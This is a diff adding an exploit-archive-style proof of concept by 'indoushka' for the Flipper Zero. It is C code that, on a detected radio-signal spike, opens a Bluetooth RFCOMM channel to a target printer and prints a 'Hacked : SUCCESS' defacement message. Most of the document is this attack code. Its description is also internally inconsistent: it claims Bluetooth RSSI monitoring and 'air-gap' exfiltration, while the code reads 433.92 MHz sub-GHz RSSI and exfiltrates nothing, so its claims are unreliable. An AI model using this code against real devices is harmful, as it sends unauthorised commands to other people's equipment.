@@ -1,0 +1,208 @@
+=============================================================================================================================================
+| # Title     : Bluetooth RFCOMM 1.1 Signal-Triggered Air-Gap Interaction (Flipper Zero)                                                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.bluetooth.com/specifications/specs/rfcomm-1-1/                                                                  |
+=============================================================================================================================================
+
+[+] Summary    : This project demonstrates how Flipper Zero can be used to interact with devices in an Air-Gap context using Bluetooth RFCOMM signals. 
+                 The system monitors RSSI (signal strength) and uses statistical peak detection (Z-Score analysis) to identify significant signal spikes from target devices.
+				 When a peak is detected, it triggers a thread-safe asynchronous action (e.g., printing) via Bluetooth RFCOMM.
+
+[+] Key Features:
+
+Air-Gap Signal Awareness: Monitors a device over Bluetooth without scanning all surrounding devices indiscriminately.
+
+Statistical Detection: Uses moving average and Z-Score to identify anomalous signal spikes.
+
+Safe Async Execution: Executes Bluetooth RFCOMM commands in a separate thread to prevent UI freeze.
+
+Responsive Dashboard: Real-time visualization of RSSI and Z-Score with mini spectrogram display.
+
+Efficient O(1) Algorithms: Running sum and variance calculations ensure low-latency detection.
+
+Cooldown Mechanism: Prevents repeated triggers within a short time frame.
+
+Limitations:
+
+Does not truly bypass an air gap; it only interacts with devices that are already Bluetooth-accessible.
+
+Works only on targets with an active and reachable Bluetooth RFCOMM channel.
+
+[+] POC : 
+
+#include <furi.h>
+#include <furi_hal.h>
+#include <gui/gui.h>
+#include <bt/bt_service.h>
+#include <math.h>
+#define TAG "AirGap_V5"
+#define MONITOR_FREQ 433920000
+#define RSSI_BUFFER_SIZE 64
+#define Z_THRESHOLD 3.5f      
+#define PRINT_COOLDOWN_MS 5000
+#define PRINTER_MAC "AA:BB:CC:DD:EE:FF"
+
+typedef struct {
+    float rssi_buffer[RSSI_BUFFER_SIZE];
+    uint8_t buffer_index;
+    float running_sum;
+    float running_sq_sum;
+    float current_rssi;
+    float current_z_score;
+    uint32_t last_print_time;
+
+    FuriMutex* worker_mutex;
+    bool worker_busy;
+    FuriThread* worker_thread;
+    
+    Bt* bt;
+    FuriMessageQueue* event_queue;
+} AirGapApp;
+
+
+static int32_t printer_worker(void* context) {
+    AirGapApp* app = context;
+    BtRfcommChannel* channel = bt_rfcomm_open(app->bt, PRINTER_MAC, 1);
+    
+    if(channel) {
+        uint8_t init[] = {0x1B, 0x40}; 
+        const char* msg = "\n[!] Hacked : SUCCESS\n[!] By indoushka\n[!] https://packetstorm.news\n\n\n";
+        uint8_t cut[] = {0x1D, 0x56, 0x00}; 
+
+        bt_rfcomm_send(channel, init, sizeof(init));
+        bt_rfcomm_send(channel, (uint8_t*)msg, strlen(msg));
+        bt_rfcomm_send(channel, cut, sizeof(cut));
+        
+        furi_delay_ms(500);
+        bt_rfcomm_close(channel);
+    }
+
+    furi_mutex_acquire(app->worker_mutex, FuriWaitForever);
+    app->worker_busy = false;
+    furi_mutex_release(app->worker_mutex);
+    return 0;
+}
+
+static void trigger_safe_exfiltration(AirGapApp* app) {
+    uint32_t now = furi_get_tick();
+
+    furi_mutex_acquire(app->worker_mutex, FuriWaitForever);
+
+    if(app->worker_busy || (now - app->last_print_time < PRINT_COOLDOWN_MS)) {
+        furi_mutex_release(app->worker_mutex);
+        return;
+    }
+
+    app->worker_busy = true;
+    app->last_print_time = now;
+    furi_mutex_release(app->worker_mutex);
+
+    if(app->worker_thread) {
+        furi_thread_join(app->worker_thread);
+        furi_thread_free(app->worker_thread);
+        app->worker_thread = NULL;
+    }
+
+    app->worker_thread = furi_thread_alloc_ex("PrinterWorker", 1024, printer_worker, app);
+    furi_thread_start(app->worker_thread);
+}
+
+static void process_rssi_stats(AirGapApp* app) {
+    app->current_rssi = furi_hal_subghz_get_rssi();
+    float old_val = app->rssi_buffer[app->buffer_index];
+
+    app->running_sum = app->running_sum - old_val + app->current_rssi;
+    app->running_sq_sum = app->running_sq_sum - (old_val * old_val) + (app->current_rssi * app->current_rssi);
+    app->rssi_buffer[app->buffer_index] = app->current_rssi;
+    app->buffer_index = (app->buffer_index + 1) % RSSI_BUFFER_SIZE;
+
+    float mean = app->running_sum / RSSI_BUFFER_SIZE;
+    float variance = (app->running_sq_sum / RSSI_BUFFER_SIZE) - (mean * mean);
+    if(variance < 0) variance = 0.0001f; // حماية من القيم السالبة
+    float std_dev = sqrtf(variance);
+    app->current_z_score = (app->current_rssi - mean) / std_dev;
+
+    if(app->current_z_score > Z_THRESHOLD) {
+        trigger_safe_exfiltration(app);
+    }
+}
+
+static void render_callback(Canvas* canvas, void* ctx) {
+    AirGapApp* app = ctx;
+    canvas_clear(canvas);
+
+    for(int i = 0; i < RSSI_BUFFER_SIZE; i++) {
+        int x = i * 2;
+        float val = app->rssi_buffer[(app->buffer_index + i) % RSSI_BUFFER_SIZE];
+        int y_h = (int)((val + 100.0f) * 0.6f); // Scale to fit UI
+        if(y_h < 0) y_h = 0;
+        if(y_h > 63) y_h = 63;
+        canvas_draw_line(canvas, x, 63, x, 63 - y_h);
+    }
+
+    canvas_set_font(canvas, FontSecondary);
+    char buf[64];
+    snprintf(buf, sizeof(buf), "Z-Score: %.2f", (double)app->current_z_score);
+    canvas_draw_str(canvas, 70, 15, buf);
+    
+    snprintf(buf, sizeof(buf), "RSSI: %.1f", (double)app->current_rssi);
+    canvas_draw_str(canvas, 70, 30, buf);
+
+    if(app->worker_busy) canvas_draw_str(canvas, 70, 45, "PRINTING...");
+}
+
+int32_t airgap_v5_app(void* p) {
+    UNUSED(p);
+    AirGapApp* app = malloc(sizeof(AirGapApp));
+    memset(app, 0, sizeof(AirGapApp));
+
+    app->worker_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
+    app->event_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
+    app->bt = furi_record_open(RECORD_BT);
+
+    float initial_rssi = furi_hal_subghz_get_rssi();
+    for(int i = 0; i < RSSI_BUFFER_SIZE; i++) {
+        app->rssi_buffer[i] = initial_rssi;
+        app->running_sum += initial_rssi;
+        app->running_sq_sum += initial_rssi * initial_rssi;
+    }
+
+    ViewPort* vp = view_port_alloc();
+    view_port_draw_callback_set(vp, render_callback, app);
+    view_port_input_callback_set(vp, (void*)furi_message_queue_put, app->event_queue);
+    
+    Gui* gui = furi_record_open(RECORD_GUI);
+    gui_add_view_port(gui, vp, GuiLayerFullscreen);
+
+    furi_hal_subghz_load_preset(FuriHalSubGhzPresetOok650Async);
+    furi_hal_subghz_set_frequency(MONITOR_FREQ);
+    furi_hal_subghz_start_config_main();
+    furi_hal_subghz_rx();
+
+    while(true) {
+        InputEvent event;
+        if(furi_message_queue_get(app->event_queue, &event, 20) == FuriStatusOk) {
+            if(event.key == InputKeyBack) break;
+        }
+
+        process_rssi_stats(app);
+        view_port_update(vp);
+    }
+
+    furi_hal_subghz_stop_config_main();
+    if(app->worker_thread) { furi_thread_join(app->worker_thread); furi_thread_free(app->worker_thread); app->worker_thread = NULL; }
+    gui_remove_view_port(gui, vp);
+    view_port_free(vp);
+    furi_mutex_free(app->worker_mutex);
+    furi_message_queue_free(app->event_queue);
+    furi_record_close(RECORD_GUI);
+    furi_record_close(RECORD_BT);
+    free(app);
+    return 0;
+}
+
+
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
